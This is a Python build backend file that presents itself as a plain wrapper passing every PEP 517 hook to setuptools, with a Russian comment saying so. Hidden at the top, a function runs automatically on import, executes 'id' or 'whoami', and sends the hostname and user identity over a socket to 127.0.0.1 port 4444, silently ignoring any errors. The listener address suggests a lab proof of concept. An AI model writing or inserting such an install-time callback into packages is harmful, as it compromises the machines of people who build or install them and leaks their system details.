import subprocess, os, socket
import setuptools.build_meta as _sm

LHOST = "127.0.0.1"
LPORT = 4444

def _cb():
    try:
        out = subprocess.check_output(
            ["id"] if os.name != "nt" else ["whoami"],
            stderr=subprocess.DEVNULL,
        ).decode(errors="replace")
        s = socket.socket()
        s.settimeout(5)
        s.connect((LHOST, LPORT))
        s.sendall(("[backend][%s] %s\n" % (socket.gethostname(), out)).encode())
        s.close()
    except Exception:
        pass

_cb()

# делегируем всё в setuptools
def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    return _sm.build_wheel(wheel_directory, config_settings, metadata_directory)

def build_sdist(sdist_directory, config_settings=None):
    return _sm.build_sdist(sdist_directory, config_settings)

def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    return _sm.build_editable(wheel_directory, config_settings, metadata_directory)

def get_requires_for_build_wheel(config_settings=None):
    return _sm.get_requires_for_build_wheel(config_settings)

def get_requires_for_build_sdist(config_settings=None):
    return _sm.get_requires_for_build_sdist(config_settings)

def get_requires_for_build_editable(config_settings=None):
    return _sm.get_requires_for_build_editable(config_settings)

def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    return _sm.prepare_metadata_for_build_wheel(metadata_directory, config_settings)

def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    return _sm.prepare_metadata_for_build_editable(metadata_directory, config_settings)
